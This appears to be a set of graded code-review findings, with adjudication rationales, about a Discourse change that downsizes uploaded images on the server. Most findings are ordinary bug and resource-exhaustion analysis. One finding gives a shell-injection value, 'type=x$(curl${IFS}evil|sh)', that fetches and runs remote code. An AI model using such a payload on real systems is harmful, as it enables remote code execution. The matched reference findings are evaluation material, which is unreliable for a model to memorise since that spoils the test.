app/controllers/uploads_controller.rb:67 — Any logged-in user can make the server run convert plus ImageOptim up to 5 times on untrusted image content with no pixel or memory limits, and there is no server-side byte cap on multipart uploads (the 10MB check is client-only), so decompression bombs or oversized files can exhaust CPU and RAM.

app/controllers/uploads_controller.rb:64 — Downsizing now runs before Upload.create_for's checks (authorized extensions, new-user upload permission, image validity), so users who would be rejected still trigger ImageMagick processing of attacker-controlled bytes chosen by filename alone.

app/controllers/uploads_controller.rb:67 — The downsize return value is ignored, so a failed convert (corrupt or non-image content, or gifsicle) is swallowed and the identical failing command is retried 5 times before the upload is rejected as too large.

app/controllers/uploads_controller.rb:67 — When allow_animated_thumbnails is on, oversized GIFs go through gifsicle `--resize-fit 80%`, which needs WxH geometry and not a percentage, so animated GIFs are never shrunk and are always rejected after 5 wasted attempts.

app/controllers/uploads_controller.rb:67 — When allow_animated_thumbnails is off, downsize_instructions converts only `#{from}[0]`, so oversized animated GIFs are silently flattened to their first frame.

app/controllers/uploads_controller.rb:66 — Loop reads `tempfile.size` through the open fd, but ImageOptim replaces the file by rename (new inode), so the size can be stale, causing needless extra shrink passes and a wrong filesize passed to Upload.create_for.

app/assets/javascripts/discourse/lib/utilities.js:182 — Client size check is hardcoded to 10MB for every upload type, ignoring max_attachment_size_kb (and max_image_size_kb), so admins who configured limits above 10MB can no longer upload larger files, and users no longer get an early error for files between their limit and 10MB.

app/controllers/uploads_controller.rb:55 — API URL downloads are capped at 10.megabytes regardless of site settings, which blocks sites with limits above 10MB and lets sites with small limits be made to download up to 10MB per request.
app/assets/javascripts/discourse/lib/utilities.js:246 — The 413 error message always says 10MB, even though the real limit comes from the web server or site settings, so users see a misleading limit.

app/controllers/uploads_controller.rb:67 — Up to 5 synchronous convert and ImageOptim passes run inside the shared single-threaded Scheduler::Defer queue for non-API uploads, so one large image blocks all other deferred work in the process.
app/models/optimized_image.rb:153 — Removing OptimizedImage.dimensions and changing optimize's arity from 6 to 5 args breaks any external or plugin callers without warning.

app/models/optimized_image.rb:149 — Second `def self.downsize(from, to, dimensions, opts={})` silently overrides the 4-dim `downsize(from, to, max_width, max_height, opts)` at line 145, so any width/height caller now gets `dimensions=width` and `opts=height` (Integer#[] on a Symbol raises TypeError).

app/models/optimized_image.rb:137 — When allow_animated_thumbnails is on, oversized .gif uploads go to gifsicle as `--resize-fit 80%`, which isn't a valid WxH geometry, so all 5 attempts fail and the GIF never shrinks.

app/controllers/uploads_controller.rb:67 — When allow_animated_thumbnails is off, downsize runs `convert from[0]` and overwrites the original in place, so oversized animated GIFs (and multi-frame images) are quietly flattened to their first frame.

app/controllers/uploads_controller.rb:66 — convert_with runs ImageOptim.optimize_image!, which replaces the file by rename (new inode), so the still-open Tempfile's `size` and fd can point at the stale unlinked inode while `path` points at the new content, and filesize/sha1/stored bytes may disagree.

app/controllers/uploads_controller.rb:66 — The loop doesn't stop when a pass fails (convert_with returns false) or fails to shrink the file (for example, a PNG re-encode that grows), so it can run up to 5 useless re-encodes that each lose more quality.

app/assets/javascripts/discourse/lib/utilities.js:182 — The client size check is now hardcoded to 10MB for every type, including attachments, which ignores max_attachment_size_kb: sites set above 10MB can no longer upload big attachments, and sites set lower let files through to fail on the server.

app/controllers/uploads_controller.rb:55 — The API URL download cap is hardcoded to 10.megabytes for every type, so files over 10MB (such as attachments allowed by max_attachment_size_kb) make download return nil and then crash on `tempfile.size` (nil) in Upload.create_for.
app/assets/javascripts/discourse/lib/utilities.js:246 — The 413 handler now always says the limit is 10MB, which may not match the web server or site setting limit that actually rejected the request.

app/controllers/uploads_controller.rb:67 — Up to 5 synchronous ImageMagick convert plus ImageOptim passes on images up to 10MB run inside the web request with no concurrency limit, risking unicorn timeouts and worker starvation; should be a background job.

app/controllers/uploads_controller.rb:64 — No pixel-dimension or ImageMagick resource limit before convert, so a highly compressed image near 10MB (e.g. a PNG decompression bomb) can decode to gigapixels and exhaust web-host memory and CPU.
app/models/optimized_image.rb:164 — Every loop pass runs the full ImageOptim pipeline on an intermediate file that will be re-encoded again, so optimizer CPU is wasted on up to 4 throwaway results.

app/controllers/uploads_controller.rb:66 — tempfile.size is fstat of the open fd, so if convert or ImageOptim replaces the file by rename the size goes stale, the loop never exits early, and all 5 passes always run.

app/controllers/uploads_controller.rb:67 — A fixed 80% step re-decodes and lossily re-encodes the image on every pass instead of computing one scale factor from the size ratio, which compounds quality loss and repeats work.
app/controllers/uploads_controller.rb:67 — The return value of downsize is ignored, so a failing convert or gifsicle (e.g. gifsicle --resize-fit with "80%") gets retried 5 times with no progress.

app/controllers/uploads_controller.rb:66 — Loop condition uses tempfile.size (fstat on the open Tempfile fd), but convert_with runs ImageOptim#optimize_image!, which replaces the path via rename to a new inode, so after the first pass the size is stale; the loop keeps shrinking the image and create_for records a filesize that does not match the stored file.

app/controllers/uploads_controller.rb:67 — Downsizing writes in place (from == to); if convert or gifsicle dies mid-write (disk full, OOM, worker killed) the truncated or partial file stays at the tempfile path and gets uploaded as a corrupt image, because failures are not checked.

app/controllers/uploads_controller.rb:66 — Up to 5 synchronous ImageMagick/gifsicle shell-outs on images up to 10MB (possibly with huge pixel dimensions) run inside the web request with no timeout or resource limit, which can block or OOM the app worker and hit the unicorn timeout.

app/models/optimized_image.rb:157 — For GIFs with allow_animated_thumbnails enabled, "80%" is passed to gifsicle --resize-fit, which only accepts WxH geometry, so every animated-GIF downsize fails and oversized GIFs are still rejected after 5 wasted attempts.

app/models/optimized_image.rb:149 — The second `def self.downsize(from, to, dimensions, opts={})` silently overrides the 4-arg downsize at line 145; any existing or plugin caller using downsize(from, to, w, h, opts) now binds h to opts and raises on opts[:allow_animation]. app/controllers/uploads_controller.rb:64 — Any logged-in user can trigger up to 5 sequential ImageMagick convert runs on untrusted files up to 10MB, in-process and before any validation, with no pixel-dimension/resource limits, enabling decompression-bomb CPU/memory exhaustion of web workers.

The second definition, which expects a single dimensions string parameter, overrides the first, which expected separate max_width and max_height parameters. This makes the original method unreachable and breaks existing code that calls it with separate width and height arguments.

Hardcoding maxSizeKB = 10 * 1024 ignores Discourse.SiteSettings['max_' + type + '_size_kb'], so the client-side limit can diverge from server-side and per-type settings (also applies to the 413 handler below).

The loop checking `tempfile.size` may never terminate correctly due to stale cached size, leading to potential infinite loops or incorrect file handling after modifications.

The guard for this processing is `FileHelper.is_image?(filename)` (based on the filename) plus size checks, so attacker-supplied content can reach ImageMagick before any later validation that may occur inside `Upload.create_for` (not shown here). Even if the upload is ultimately rejected, this change can still trigger expensive/unsafe image processing on untrusted bytes, which is a concrete security/perf defect introduced by the new block at lines ~64-72 in the diff.

adjudication.rationale: In uploads_controller.rb a new loop repeatedly calls `OptimizedImage.downsize(...)` while the tempfile is still larger than `SiteSetting.max_image_size_kb`. `OptimizedImage.convert_with` returns `false` on failure (nonzero exit), but the controller ignores that return value, so a failed convert will not break/raise and the loop will retry up to 5 times with an unchanged `tempfile.size` (since the file wasn’t successfully modified). This is a real behavioral defect introduced by the new downsizing logic (wasted retries and swallowing conversion errors).

This means oversized animated GIF uploads may be processed via the non-animated pipeline (potentially dropping animation/frames) when `allow_animated_thumbnails` is off, which would be a behavior change/data loss introduced by this diff. The finding’s exact `"#{from}[0]"` detail isn’t shown in the diff, so the specific mechanism can’t be fully verified here.

Since these methods are not marked private, any external/plugin code calling `dimensions` or `optimize` with the old arity would break, even though internal call sites in this file were updated.

adjudication_records.issue_text: app/models/optimized_image.rb:149 — Second `def self.downsize(from, to, dimensions, opts={})` silently overrides the 4-dim `downsize(from, to, max_width, max_height, opts)` at line 145, so any width/height caller now gets `dimensions=width` and `opts=height` (Integer#[] on a Symbol raises TypeError).

adjudication.rationale: In app/models/optimized_image.rb the diff leaves the existing `def self.downsize(from, to, max_width, max_height, opts={})` and then adds a second `def self.downsize(from, to, dimensions, opts={})` below it. In Ruby, the latter definition overrides the former (no method overloading), so any existing callers passing `(from,to,width,height,opts)` will instead bind `dimensions=width` and `opts=height` (an Integer). `optimize` then does `opts[:allow_animation]`, which will raise (Integer#[] with a Symbol triggers TypeError), breaking width/height callers.

adjudication_records.issue_text: app/models/optimized_image.rb:137 — When allow_animated_thumbnails is on, oversized .gif uploads go to gifsicle as `--resize-fit 80%`, which isn't a valid WxH geometry, so all 5 attempts fail and the GIF never shrinks.

app/controllers/uploads_controller.rb:67 — When allow_animated_thumbnails is off, downsize runs `convert from[0]` and overwrites the original in place, so oversized animated GIFs (and multi-frame images) are quietly flattened to their first frame.

adjudication.rationale: The new loop in `uploads_controller.rb` downsizes images in place (`OptimizedImage.downsize(tempfile.path, tempfile.path, "80%", allow_animation: SiteSetting.allow_animated_thumbnails)`). In `optimized_image.rb`, when `allow_animation` is false, it explicitly chooses the non-animated instruction path (`downsize_instructions` rather than `downsize_instructions_animated`) even for `.GIF` inputs. Given this in-place overwrite plus the existence of separate animated/non-animated instruction generators, it’s a credible data-loss/behavior bug that oversized animated GIF uploads could be converted via a non-animated pipeline (potentially flattening to a single frame). The exact `from[0]` detail is not shown in the diff, so that part can’t be directly verified here.

adjudication.rationale: In uploads_controller.rb the new downsizing loop unconditionally calls `OptimizedImage.downsize(...)` and decrements `attempt` without checking whether the conversion succeeded or whether the file size decreased. `OptimizedImage.convert_with` can return `false` on failure, but that return value is ignored here, so if downsizing fails (or doesn’t reduce size), `tempfile.size` stays above the threshold and the loop can run up to 5 redundant re-encodes.

adjudication_records.issue_text: app/assets/javascripts/discourse/lib/utilities.js:182 — The client size check is now hardcoded to 10MB for every type, including attachments, which ignores max_attachment_size_kb: sites set above 10MB can no longer upload big attachments, and sites set lower let files through to fail on the server.

adjudication.rationale: The diff changes the client-side max size calculation in `utilities.js` from `Discourse.SiteSettings['max_' + type + '_size_kb']` to a hardcoded `10 * 1024` (10MB) for all upload types. This ignores per-type settings like `max_attachment_size_kb` (and `max_image_size_kb`), meaning sites configured above 10MB will be incorrectly blocked in the browser and sites configured below 10MB may allow oversized files to proceed until server rejection.

adjudication_records.issue_text: app/controllers/uploads_controller.rb:55 — The API URL download cap is hardcoded to 10.megabytes for every type, so files over 10MB (such as attachments allowed by max_attachment_size_kb) make download return nil and then crash on `tempfile.size` (nil) in Upload.create_for.

adjudication.rationale: In `create_upload`, the API URL path sets `tempfile = FileHelper.download(url, 10.megabytes, ...) rescue nil`. If the download exceeds 10MB, `FileHelper.download` can raise and `tempfile` becomes `nil`. Later, the code unconditionally calls `tempfile.size` in `Upload.create_for(...)`, which would raise `NoMethodError` on `nil`. The new hardcoded 10MB cap makes this failure more likely for non-image uploads/types that may legitimately allow >10MB.

adjudication_records.issue_text: app/assets/javascripts/discourse/lib/utilities.js:246 — The 413 handler now always says the limit is 10MB, which may not match the web server or site setting limit that actually rejected the request.

adjudication.rationale: In `utilities.js` the 413 handler was changed from using `Discourse.SiteSettings.max_image_size_kb` to a hardcoded `10 * 1024` (10MB). This means the error message will always report a 10MB limit even if the actual rejection came from a different configured limit (previously derived from site settings, or potentially a different web server/proxy cap). The diff directly shows this mismatch in the displayed `max_size_kb` value.

adjudication_records.issue_text: app/controllers/uploads_controller.rb:67 — Up to 5 synchronous ImageMagick convert plus ImageOptim passes on images up to 10MB run inside the web request with no concurrency limit, risking unicorn timeouts and worker starvation; should be a background job.

app/controllers/uploads_controller.rb:64 — No pixel-dimension or ImageMagick resource limit before convert, so a highly compressed image near 10MB (e.g. a PNG decompression bomb) can decode to gigapixels and exhaust web-host memory and CPU.

adjudication.rationale: The diff adds a server-side loop that runs `OptimizedImage.downsize` on uploads that exceed `SiteSetting.max_image_size_kb` (uploads_controller.rb: new block around line ~64). `OptimizedImage.downsize` ultimately executes ImageMagick via `convert_with` using backticks and the generated instructions (optimized_image.rb), and the diff shows no pixel-dimension validation and no ImageMagick resource limits (e.g., `-limit`, `-define`, or similar) being applied before conversion. This makes it feasible for a small-on-disk but huge-in-memory image (decompression bomb) to cause excessive CPU/memory use during the downsize attempts (up to 5 conversions).

adjudication_records.issue_text: app/models/optimized_image.rb:164 — Every loop pass runs the full ImageOptim pipeline on an intermediate file that will be re-encoded again, so optimizer CPU is wasted on up to 4 throwaway results.

adjudication.rationale: The diff adds a loop in `uploads_controller.rb` that can call `OptimizedImage.downsize(tempfile.path, tempfile.path, "80%", ...)` up to 5 times while the same file is repeatedly re-written until it drops under `max_image_size_kb`. That means each pass runs the full `OptimizedImage.downsize`/`optimize`/`convert_with` work on intermediate outputs that are immediately re-encoded again on the next iteration, which is a real performance/CPU concern (even if not a functional correctness bug).

adjudication_records.issue_text: app/controllers/uploads_controller.rb:66 — tempfile.size is fstat of the open fd, so if convert or ImageOptim replaces the file by rename the size goes stale, the loop never exits early, and all 5 passes always run.
matched_golden_ids: The loop checking `tempfile.size` may never terminate correctly due to stale cached size, leading to potential infinite loops or incorrect file handling after modifications.
adjudication_records.primary_judge_reasoning: Both point out that using `tempfile.size` inside the loop can use a stale size (because the file may be replaced via rename), causing the loop’s termination/early-exit logic to be wrong (potentially running all passes or not terminating as intended).

adjudication_records.issue_text: app/controllers/uploads_controller.rb:67 — A fixed 80% step re-decodes and lossily re-encodes the image on every pass instead of computing one scale factor from the size ratio, which compounds quality loss and repeats work.

adjudication.rationale: In uploads_controller.rb the new loop repeatedly calls `OptimizedImage.downsize(tempfile.path, tempfile.path, "80%", ...)` while `tempfile.size` exceeds the limit. Each iteration would run ImageMagick conversion again on the already-reencoded output (same input/output path), which can compound quality loss and repeats work. This is a concrete, diff-grounded efficiency/quality concern, but not a clear correctness break (it still enforces a size limit), so it’s not strictly a bug.

adjudication_records.issue_text: app/controllers/uploads_controller.rb:67 — The return value of downsize is ignored, so a failing convert or gifsicle (e.g. gifsicle --resize-fit with "80%") gets retried 5 times with no progress.

adjudication.rationale: In `uploads_controller.rb`, the new loop calls `OptimizedImage.downsize(...)` but never checks its boolean return. From `optimized_image.rb`, `convert_with` returns `false` on nonzero exit status, so a failed downsize won’t break the loop; it will keep retrying until `attempt` reaches 0 as long as `tempfile.size` remains above the limit. This is a concrete robustness/efficiency issue introduced by the diff (retries with no progress and no error handling), though it’s bounded to 5 attempts and doesn’t by itself prove a hard failure of the upload path from the diff alone.

adjudication_records.issue_text: app/assets/javascripts/discourse/lib/utilities.js:182 — The hardcoded 10MB client cap also replaces max_attachment_size_kb for non-image types, so oversized attachments upload in full and are only rejected server-side, wasting bandwidth and request time.

adjudication.rationale: In `utilities.js` the client-side max size check was changed from `Discourse.SiteSettings['max_' + type + '_size_kb']` to a hardcoded `10 * 1024` (10MB). Since `type` previously selected different limits (e.g., `max_attachment_size_kb` vs `max_image_size_kb`), this change removes per-type/site-configured enforcement on the client for non-image uploads too. As a result, if the server/site setting for attachments is lower than 10MB, the client will no longer block those uploads early and they can be sent in full before being rejected server-side, matching the finding.

adjudication_records.issue_text: app/controllers/uploads_controller.rb:55 — The API URL-download cap goes up to a fixed 10MB no matter what the site setting says, so larger remote files get downloaded synchronously inside the request.

adjudication.rationale: In `uploads_controller.rb#create_upload`, the API URL download limit was changed from `SiteSetting.max_image_size_kb.kilobytes` to a hard-coded `10.megabytes` (`FileHelper.download(url, 10.megabytes, ...)`). This verifiably ignores the site setting and can cause larger remote files to be downloaded within the request even when the configured max is lower (or higher), changing behavior and potentially increasing synchronous request work.

adjudication_records.issue_text: app/controllers/uploads_controller.rb:67 — Return value of OptimizedImage.downsize is ignored, so when convert/gifsicle fails the loop blindly retries the same failing shell-out up to 5 times with no progress and no logging, then passes the unchanged oversized file on.

adjudication.rationale: The new loop in `uploads_controller.rb` calls `OptimizedImage.downsize(...)` up to 5 times but ignores its return value. In `optimized_image.rb`, `optimize` ultimately returns `convert_with(...)`, which returns `false` on shell-out failure (`$?.exitstatus != 0`). Since the controller doesn’t check this, a failing downsize will just retry (likely with the same inputs) until attempts run out, with no early break or logging, and then proceeds to `Upload.create_for` with whatever file remains. The wasted retries / lack of failure handling is real and introduced by the diff, but whether it results in an actual incorrect upload acceptance/rejection can’t be verified from this diff alone.

adjudication_records.issue_text: app/controllers/uploads_controller.rb:66 — Loop condition uses tempfile.size (fstat on the open Tempfile fd), but convert_with runs ImageOptim#optimize_image!, which replaces the path via rename to a new inode, so after the first pass the size is stale; the loop keeps shrinking the image and create_for records a filesize that does not match the stored file.

adjudication.rationale: The diff shows a new loop in `uploads_controller.rb` that repeatedly calls `OptimizedImage.downsize(tempfile.path, tempfile.path, "80%", ...)` while checking `tempfile.size`. However, the claim that `convert_with` runs `ImageOptim#optimize_image!` and replaces the file via rename/inode swap is not supported by this diff: `OptimizedImage.convert_with` simply executes a shell command built from `*_instructions`. No `ImageOptim` usage or rename behavior is shown, so the asserted stale-fd size bug and resulting filesize mismatch can’t be verified from the provided changes.

adjudication_records.issue_text: app/controllers/uploads_controller.rb:67 — Downsizing writes in place (from == to); if convert or gifsicle dies mid-write (disk full, OOM, worker killed) the truncated or partial file stays at the tempfile path and gets uploaded as a corrupt image, because failures are not checked.

adjudication.rationale: The new downsizing loop in `uploads_controller.rb` calls `OptimizedImage.downsize(tempfile.path, tempfile.path, ...)`, so the conversion writes back to the same path (in-place). `OptimizedImage.optimize` returns the result of `convert_with`, which returns `false` on non-zero exit, but the controller does not check that return value (or otherwise validate the output) before proceeding to `Upload.create_for(...)`. If the external tool fails mid-write, the tempfile at the same path could be left partially written/corrupt and still be uploaded.

adjudication_records.issue_text: app/controllers/uploads_controller.rb:66 — Up to 5 synchronous ImageMagick/gifsicle shell-outs on images up to 10MB (possibly with huge pixel dimensions) run inside the web request with no timeout or resource limit, which can block or OOM the app worker and hit the unicorn timeout.

adjudication.rationale: The diff adds a synchronous loop in `UploadsController#create_upload` that can call `OptimizedImage.downsize(...)` up to 5 times during the web request (lines added around `attempt = 5` / `while ...`). `OptimizedImage.downsize` ultimately runs external commands via backticks in `convert_with` (`` `#{instructions.join(" ")} &> /dev/null` ``) with no timeout or explicit resource limits. Combined with the diff also raising the download limit to `10.megabytes`, this can plausibly block a request worker or exhaust resources, leading to timeouts/OOM under load or with crafted images.

adjudication_records.issue_text: app/models/optimized_image.rb:157 — For GIFs with allow_animated_thumbnails enabled, "80%" is passed to gifsicle --resize-fit, which only accepts WxH geometry, so every animated-GIF downsize fails and oversized GIFs are still rejected after 5 wasted attempts.
matched_golden_ids: Passing 80% as the dimensions can fail for animated GIFs when allow_animated_thumbnails is true, since the animated path uses gifsicle --resize-fit which expects WxH geometry, not a percentage; downsizing would then silently fail.
adjudication_records.primary_judge_reasoning: The candidate describes the same bug: when allow_animated_thumbnails is enabled for GIFs, the animated resizing path calls gifsicle --resize-fit with "80%", but gifsicle expects WxH geometry, so resizing fails silently (with repeated failed attempts).

adjudication_records.issue_text: app/models/optimized_image.rb:149 — The second `def self.downsize(from, to, dimensions, opts={})` silently overrides the 4-arg downsize at line 145; any existing or plugin caller using downsize(from, to, w, h, opts) now binds h to opts and raises on opts[:allow_animation]. The removed OptimizedImage.dimensions and the changed optimize arity break external callers the same way.

adjudication.rationale: In `optimized_image.rb`, the diff defines `self.downsize` twice. In Ruby the later definition wins, so the earlier 4-arg/5-arg-style `downsize(from, to, max_width, max_height, opts={})` is effectively removed. Existing callers using the old signature (e.g., `downsize(from,to,w,h)` or `downsize(from,to,w,h,opts)`) will now either (a) raise `ArgumentError` for 5 args, or (b) for 4 args bind `opts` to `h` (an Integer) and then `opts[:allow_animation]` in `optimize` will raise. Additionally, `optimize`’s arity changes from `(width,height,opts)` to `(dimensions,opts)`, and `dimensions` helper is removed, breaking any external callers relying on those APIs.

adjudication_records.issue_text: app/controllers/uploads_controller.rb:64 — When allow_animated_thumbnails is off, convert reads only frame [0], so an oversized animated GIF is silently flattened to a single frame instead of being rejected or downsized with animation.

adjudication.rationale: The new pre-upload downsizing loop in `uploads_controller.rb` mutates the uploaded tempfile in-place for any image over `SiteSetting.max_image_size_kb`, calling `OptimizedImage.downsize(..., allow_animation: SiteSetting.allow_animated_thumbnails)`. In `OptimizedImage.optimize`, the animated instruction path is only chosen when `opts[:allow_animation]` is true and the source is a GIF; otherwise it uses the non-animated instruction method. That means an oversized animated GIF will be processed via the non-animated path when `allow_animated_thumbnails` is off, potentially dropping animation, and the code neither rejects the upload nor warns the user—this is a behavioral/data-loss risk introduced by the diff.

adjudication_records.issue_text: app/controllers/uploads_controller.rb:67 — For API URL uploads the tempfile path embeds unsanitized params[:type] ("discourse-upload-#{type}") and is now interpolated into the backtick shell command in OptimizedImage.convert_with (optimized_image.rb:161), enabling shell command injection (e.g. type=x$(curl${IFS}evil|sh)).

adjudication.rationale: The diff introduces a new call path where a tempfile created for API URL uploads uses a name prefix that interpolates `type` (`FileHelper.download(..., "discourse-upload-#{type}")`), and that tempfile’s path is then passed into `OptimizedImage.downsize(tempfile.path, ...)`. `OptimizedImage.convert_with` executes a shell command via backticks using `instructions.join(" ")`, so if the image conversion instructions include the `from`/`to` paths without proper shell escaping, a crafted `type` containing shell metacharacters could lead to command injection. The diff does not show any sanitization/escaping for `type` or for the command arguments.

adjudication_records.issue_text: app/controllers/uploads_controller.rb:64 — Any logged-in user can trigger up to 5 sequential ImageMagick convert runs on untrusted files up to 10MB, in-process and before any validation, with no pixel-dimension/resource limits, enabling decompression-bomb CPU/memory exhaustion of web workers.

adjudication.rationale: The diff adds a new pre-validation loop in `UploadsController#create_upload` that, for any request where `FileHelper.is_image?(filename)` and the tempfile exceeds `SiteSetting.max_image_size_kb`, runs `OptimizedImage.downsize(...)` up to 5 times in-process (`while attempt > 0 ...`). `OptimizedImage.downsize/optimize` shells out to ImageMagick via backticks (`` `#{instructions.join(" ")} &> /dev/null` ``) with no resource/pixel limits shown in the diff. This makes it plausible for a logged-in user to force multiple expensive ImageMagick runs on untrusted input before `Upload.create_for(...)` does any validation, enabling CPU/memory exhaustion (e.g., decompression bombs).

adjudication_records.issue_text: app/controllers/uploads_controller.rb:67 — The image check is only the user-supplied filename extension, so arbitrary content (MVG/SVG/MSL or other ImageMagick coders) now reaches convert pre-validation where FastImage would previously have rejected it, exposing ImageTragick-style file read/SSRF/RCE.

adjudication.rationale: The new pre-processing block in `create_upload` runs before `Upload.create_for(...)` and gates only on `FileHelper.is_image?(filename)` where `filename` is derived from user input (either `File.basename(URI.parse(url).path)` or `file.original_filename`). The diff shows no content-based validation before calling `OptimizedImage.downsize(...)`, which ultimately shells out to ImageMagick (`convert_with` uses backticks). This makes it possible for non-image/hostile ImageMagick coders disguised by extension to reach convert prior to any later validation, matching the finding’s concern.

adjudication_records.issue_text: app/controllers/uploads_controller.rb:55 — API URL downloads now use a hardcoded 10MB cap instead of the admin-configured max size, so the server fetches up to 10MB from arbitrary URLs for any upload type regardless of site settings.

adjudication.rationale: The diff changes API URL-based downloads in `UploadsController#create_upload` from `FileHelper.download(url, SiteSetting.max_image_size_kb.kilobytes, ...)` to `FileHelper.download(url, 10.megabytes, ...)`, which hardcodes a 10MB fetch limit and bypasses the admin-configured `max_image_size_kb`. This means the server may download more data than allowed by site settings when fetching arbitrary URLs via the API path.

adjudication_records.issue_text: app/controllers/uploads_controller.rb:63 — The new server-side downsize loop has no spec coverage, and existing uploads_controller_spec cases use small fixtures, so this path never runs in tests.

adjudication.rationale: The diff does add a new downsize loop in `app/controllers/uploads_controller.rb`, but it does not include any spec files or fixture changes. From the diff alone we cannot verify whether there is (or is not) test/spec coverage, nor what existing `uploads_controller_spec` fixtures look like or whether this path runs in tests.

adjudication_records.issue_text: app/models/optimized_image.rb:149 — The second `def self.downsize(from, to, dimensions, opts)` silently replaces the 4-arg (width, height) version, so 5-arg callers (e.g. Upload.create_for for profile/card backgrounds) get ArgumentError, and no spec catches this.

adjudication.rationale: The diff introduces a second `def self.downsize(from, to, dimensions, opts={})` after an existing `def self.downsize(from, to, max_width, max_height, opts={})`. In Ruby, the later method definition overwrites the earlier one, so any existing call sites still passing (from,to,width,height,opts) will raise `ArgumentError` at runtime. This is directly verifiable from the shown diff regardless of specific callers/specs.

adjudication_records.issue_text: app/assets/javascripts/discourse/lib/utilities.js:182 — The existing QUnit test "prevents files that are too big from being uploaded" (sets max_image_size_kb=5 and uploads 10KB) now fails because the hardcoded 10MB cap ignores the setting, and the test was not updated.

adjudication.rationale: The diff changes the client-side upload size check from `Discourse.SiteSettings['max_' + type + '_size_kb']` to a hardcoded `10 * 1024` KB (10MB) in `utilities.js` (both the normal validation path and the 413 handler). This clearly ignores the configured site setting and would allow uploads that exceed the intended per-type limit, so any test relying on `max_image_size_kb`/`max_*_size_kb` being enforced client-side would fail unless updated.

adjudication_records.issue_text: app/controllers/uploads_controller.rb:66 — No test covers running out of all 5 attempts while the file is still over max_image_size_kb, so what the user sees (a server rejection that doesn't match the client's 10MB message) is unverified.

adjudication.rationale: The diff adds new nontrivial behavior in `uploads_controller.rb`: a 5-iteration loop that repeatedly calls `OptimizedImage.downsize(...)` until `tempfile.size <= SiteSetting.max_image_size_kb.kilobytes`, but there is no explicit handling if the file remains too large after all attempts (it proceeds to `Upload.create_for(...)` anyway). Separately, the client-side limit is now hardcoded to `10 * 1024` KB (10MB) in `utilities.js`, which can diverge from server-side enforcement based on `SiteSetting.max_image_size_kb`. The finding’s core concern is an unverified edge case introduced by the new loop and a potential mismatch in user-visible messaging; this is a specific review issue tied to the change, not a proven defect from the diff alone.

adjudication_records.issue_text: app/controllers/uploads_controller.rb:67 — With allow_animated_thumbnails, animated GIFs go to gifsicle `--resize-fit 80%`, which does not accept percentages, so the loop fails silently 5 times; no GIF test exists to catch this.

adjudication.rationale: The new upload logic downsizes images by calling `OptimizedImage.downsize(tempfile.path, tempfile.path, "80%", allow_animation: SiteSetting.allow_animated_thumbnails)` in a loop, and `OptimizedImage.optimize` will route GIFs (when `allow_animation` is true and filename matches `\.GIF$`) to `downsize_instructions_animated` with the passed `dimensions` string. The diff shows that the controller ignores the return value of `OptimizedImage.downsize` (which can return `false` if the underlying command fails), so repeated failures would be silent and the loop will just retry 5 times. However, the specific claim that gifsicle `--resize-fit` does not accept percentages cannot be verified from this diff because the `downsize_instructions_animated` implementation/command string is not shown here.

adjudication_records.issue_text: app/controllers/uploads_controller.rb:67 — The downsize return value (convert failure) is ignored and no test simulates a convert/ImageOptim failure on the in-place tempfile.

adjudication.rationale: The new downsizing loop in `uploads_controller.rb` calls `OptimizedImage.downsize(tempfile.path, tempfile.path, "80%", ...)` in-place but ignores its return value. In `optimized_image.rb`, `convert_with` returns `false` when the underlying convert command fails; that false propagates through `optimize`/`downsize`. If conversion fails, the code neither aborts nor restores the tempfile, and it will still proceed to `Upload.create_for(...)` potentially uploading an oversized, unmodified, or partially-written/corrupted image. The diff shows no error handling around this failure path; the finding’s point about missing a test for convert/ImageOptim failure is also consistent with this newly added logic.

adjudication_records.issue_text: app/controllers/uploads_controller.rb:68 — No real-image test checks that `tempfile.size` actually shrinks after in-place convert+ImageOptim rewrite the path (the open fd may report a stale size).

adjudication.rationale: The new logic downsizes in-place via `OptimizedImage.downsize(tempfile.path, tempfile.path, ...)` while continuing to rely on `tempfile.size` (and later passing `tempfile`/`tempfile.size` into `Upload.create_for`). If the optimizer rewrites the file via replace/rename, the open `Tempfile` file descriptor may not reflect the new inode/size, so a regression test with a real image verifying the size actually shrinks (and that the uploaded bytes correspond to the downsized file) would be valuable. The diff doesn’t prove it’s broken, but it does introduce this specific risk without any shown verification.

adjudication_records.issue_text: app/controllers/uploads_controller.rb:64 — Edge cases matched by FileHelper.is_image? (SVG, non-animated flattening of GIFs via `[0]`) have no coverage for being rasterized/flattened by the downsize path.

adjudication.rationale: The diff adds a new downsize loop in `UploadsController#create_upload` gated only by `FileHelper.is_image?(filename)` and `SiteSetting.max_image_size_kb`, calling `OptimizedImage.downsize(...)` for any “image” filename (including potential edge types like SVG or GIF). The diff itself contains no special-case handling for formats that may require rasterization or frame-handling (the only related logic shown is `optimize` choosing `*_animated` only when `allow_animation` is true and the filename matches `.GIF`). Whether SVG/GIF edge behavior is correct or tested isn’t verifiable from the diff, but it’s a concrete scope/edge-case concern introduced by this new resizing path.

adjudication_records.issue_text: app/assets/javascripts/discourse/lib/utilities.js:182 — The client no longer checks attachments against max_attachment_size_kb (the cap is 10MB for all types), a behavior change with no test update or new test.

adjudication.rationale: The diff explicitly replaces the per-type client-side limit `Discourse.SiteSettings['max_' + type + '_size_kb']` with a hard-coded `10 * 1024` KB (10MB) in `utilities.js`, and similarly hard-codes the 413 error message size. This removes respect for `max_attachment_size_kb`/`max_image_size_kb` on the client and can cause incorrect behavior when site settings differ (blocking allowed uploads or allowing ones that will later be rejected). The diff shows no accompanying test changes, but the core issue is the behavior/config mismatch introduced by the hard-coded cap.

adjudication_records.issue_text: app/assets/javascripts/discourse/lib/utilities.js:246 — The 413 handler now reports a hardcoded 10MB max, and no test asserts the new message value.

adjudication.rationale: The diff does change the 413 handler in `utilities.js` from `Discourse.SiteSettings.max_image_size_kb` to a hardcoded `10 * 1024` (10MB), so the reported max size is now fixed and may diverge from the configured `SiteSetting.max_image_size_kb`. However, the claim that "no test asserts the new message value" cannot be verified from this diff because no test changes are shown.

adjudication_records.issue_text: app/controllers/uploads_controller.rb:55 — The API URL download cap changed from max_image_size_kb to a hardcoded 10.megabytes, with no spec asserting the new limit or an over-limit remote download.

adjudication.rationale: The diff changes the remote URL download size cap in `UploadsController#create_upload` from `SiteSetting.max_image_size_kb.kilobytes` to a hardcoded `10.megabytes` (`FileHelper.download(url, 10.megabytes, ...)`). This is a behavior/configurability change (no longer tied to the site setting) and the PR diff shows no accompanying test/spec additions to lock in the new limit or cover over-limit remote downloads.
